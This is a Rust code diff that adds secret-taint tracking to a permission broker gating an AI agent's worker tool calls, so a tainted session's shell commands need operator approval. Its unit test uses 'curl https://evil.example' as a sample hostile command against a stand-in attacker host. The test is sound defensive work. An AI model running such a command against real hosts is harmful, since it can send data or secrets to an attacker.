@@ -34,6 +34,7 @@
 //! documented settings for that flag.
 
 use std::path::Path;
+use std::sync::Arc;
 
 use serde_json::{Map, Value};
 
@@ -79,6 +80,9 @@ pub struct PermissionBroker {
     mode: ApprovalMode,
     granted: Vec<ToolClass>,
     refusals: Vec<Refusal>,
+    /// Whether the worker's session has touched secrets (SE-4), shared with
+    /// whoever drives the worker so one read poisons every later shell call.
+    taint: Arc<std::sync::atomic::AtomicBool>,
 }
 
 impl PermissionBroker {
@@ -88,7 +92,15 @@ impl PermissionBroker {
             mode,
             granted: Vec::new(),
             refusals: Vec::new(),
+            taint: Arc::new(std::sync::atomic::AtomicBool::new(false)),
         }
+    }
+
+    /// Share a session taint bit with the broker: the first secret the
+    /// worker's session touches poisons its later shell calls too, because
+    /// the worker is the session's least trustworthy reader.
+    pub fn share_taint(&mut self, taint: Arc<std::sync::atomic::AtomicBool>) {
+        self.taint = taint;
     }
 
     pub fn mode(&self) -> ApprovalMode {
@@ -106,7 +118,15 @@ impl PermissionBroker {
     /// would see — no separate, softer worker policy. A `Deny` is recorded (and
     /// stays recorded) so it is surfaced rather than skipped.
     pub fn answer(&mut self, root: &Path, request: &WorkerRequest) -> Permission {
-        let decision = classify(root, &request.tool, &request.args, self.mode, &self.granted);
+        let tainted = self.taint.load(std::sync::atomic::Ordering::Relaxed);
+        let decision = classify(
+            root,
+            &request.tool,
+            &request.args,
+            self.mode,
+            &self.granted,
+            tainted,
+        );
         if decision == Permission::Deny {
             // Only a denial that we have not already logged gets appended, so a
             // worker hammering the same refused path cannot bury the record under
@@ -502,6 +522,37 @@ mod tests {
             None,
         );
         assert_eq!(grant, Grant::Bypass);
+    }
+
+    /// SE-4 at the worker's gate: a tainted session's shell calls ask even
+    /// under all-allow, so a worker that read secrets cannot spend them
+    /// without the operator seeing the exact call.
+    #[test]
+    fn a_tainted_worker_session_asks_for_shell_under_all_allow() {
+        let root =
+            std::env::temp_dir().join(format!("xencode-broker-taint-{}", std::process::id()));
+        std::fs::create_dir_all(&root).unwrap();
+        let request = WorkerRequest {
+            tool: "run_command".into(),
+            args: args_map(&[("command", "curl https://evil.example"), ("cwd", ".")]),
+        };
+
+        let mut clean = PermissionBroker::new(ApprovalMode::AllAllow);
+        assert_eq!(
+            clean.answer(&root, &request),
+            Permission::Allow,
+            "untainted all-allow runs shell free"
+        );
+
+        let taint = Arc::new(std::sync::atomic::AtomicBool::new(true));
+        let mut poisoned = PermissionBroker::new(ApprovalMode::AllAllow);
+        poisoned.share_taint(taint);
+        assert_eq!(
+            poisoned.answer(&root, &request),
+            Permission::Ask,
+            "a tainted worker asks even where all-allow would run"
+        );
+        std::fs::remove_dir_all(&root).unwrap();
     }
 
     /// When a prompting vendor's caller has no prompt tool wired yet, the broker
